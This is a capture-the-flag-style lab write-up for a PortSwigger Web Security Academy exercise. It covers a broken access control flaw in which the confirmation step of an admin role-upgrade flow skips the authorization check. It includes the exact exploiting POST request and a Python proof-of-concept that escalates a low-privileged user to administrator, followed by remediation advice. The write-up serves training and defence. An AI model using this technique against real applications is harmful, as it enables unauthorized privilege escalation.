# Multi-Step Process with No Access Control on One Step — Broken Access Control

**Platform:** PortSwigger Web Security Academy
**Category:** Access Control Vulnerabilities
**Date:** 2026-08-05

## The Problem

The legitimate admin-role-upgrade flow was split into two steps:
1. **Request the upgrade** (e.g. `action=upgrade` for a target `username`) — this step correctly checked that the requester was an admin
2. **Confirm the upgrade** (e.g. `action=upgrade&confirmed=true`) — this step performed the actual privilege change, but the developer forgot to repeat the same authorization check here, assuming that reaching this step already implied the first check had passed

Because each step was handled by its own code path, the access control check applied to step 1 didn't carry over to step 2. Sending step 2 directly — without ever going through step 1 as an actual admin — skipped the check entirely.

## Discovery / Exploitation

1. Log in as a normal, low-privileged user (`wiener` / `peter`)
2. Instead of attempting step 1 (which would be correctly rejected), send the final confirmation request directly:
   ```
   POST /admin-roles
   action=upgrade&confirmed=true&username=wiener
   ```
3. The server processes this as if it were confirming an already-authorized request, and upgrades `wiener` to administrator — despite `wiener` never having passed the initial authorization check

## Impact

Any authenticated user can escalate their own privileges to admin by sending only the final step of a multi-step admin process, bypassing the access control that was only enforced on the first step. This is a critical vertical privilege escalation vulnerability, and a good example of how splitting a sensitive action into multiple requests can accidentally create gaps if each step isn't independently authorized.

## Proof of Concept (Python)

This script logs in as the low-privileged user and sends the confirmation step of the admin upgrade process directly, skipping the initial (correctly-protected) request step entirely.

```python
import urllib3
import sys
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}


def upgrade_wiener_user(s, url):
    login_url = url + "/login"
    data_login = {'username': 'wiener', 'password': 'peter'}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text

    if "logout" in res:
        print("(+) successfully logged in as wiener user...")
        print("(+) upgrading user to administrator...")

        upgrade_url = url + "/admin-roles"
        data_upgrade = {'action': 'upgrade', 'confirmed': 'true', 'username': 'wiener'}
        r = s.post(upgrade_url, data=data_upgrade, verify=False, proxies=proxies)

        if r.status_code == 200:
            print("(+) upgraded successfully to administrator..")
        else:
            print("(-) could not upgrade user to administrator")
            sys.exit(-1)
    else:
        print("(-) could not log in as wiener user...")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <url>" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    upgrade_wiener_user(s, url)


if __name__ == "__main__":
    main()
```

**How it works:**
1. Logs in as the normal user (`wiener`) using a session so cookies persist
2. Sends the `admin-roles` request with both `action=upgrade` and `confirmed=true` set at once — going straight to the "confirmation" step of the flow without ever completing (or being authorized for) the initial step
3. Checks the HTTP status code to confirm the upgrade request was accepted

## Remediation

Every step of a multi-step process must independently re-verify authorization — never assume that reaching a later step implies an earlier check already passed, since steps can often be reached directly and out of order. In this case, the `confirmed=true` request must perform the exact same admin-role check that the initial request does, not skip it because "step 1 must have already validated this."
